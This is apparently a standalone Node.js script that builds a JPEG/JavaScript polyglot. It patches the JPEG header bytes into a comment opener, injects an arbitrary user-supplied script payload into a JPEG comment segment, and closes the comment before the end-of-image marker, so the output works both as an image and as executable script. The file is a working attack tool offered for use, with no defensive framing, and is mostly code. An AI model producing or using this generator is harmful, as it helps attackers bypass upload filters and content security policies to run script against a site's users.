fs = require('fs')
const argv = process.argv.slice(2);

function replaceLast(text, searchValue, replaceValue) {
  const lastOccurrenceIndex = text.lastIndexOf(searchValue)
  return `${text.slice(0, lastOccurrenceIndex)}${replaceValue}${text.slice(lastOccurrenceIndex + searchValue.length)}`
}

var fileName = argv[0]
var outFile = argv[1]
var payload = `*/=${argv[2]}/*`;

var fileContentHex = fs.readFileSync(fileName).toString('hex');
fileContentHex = fileContentHex.replace("ffd8ffe000104a46494", "ffd8ffe02f2a4a46494");

var file_header = fileContentHex.substr(0,40);
var padding = Array(12074-16).fill("00").join("");

var payload_hex = payload.split("").map(function(e) { 
	return e.charCodeAt(0).toString(16)
}).join("");

var imageContent = fileContentHex.substr(40,fileContentHex.length).slice(0, -2);
imageContent = replaceLast(imageContent, 'ffd9', '2a2f2f2fffd9');

var comment_start = 'fffe'+ (payload.length+2).toString(16).padStart(4, '0')
var newFileContent = Buffer.from(file_header + padding + comment_start + payload_hex + imageContent, "hex");

fs.writeFile(outFile, newFileContent, (error) => { if (error) throw err; })
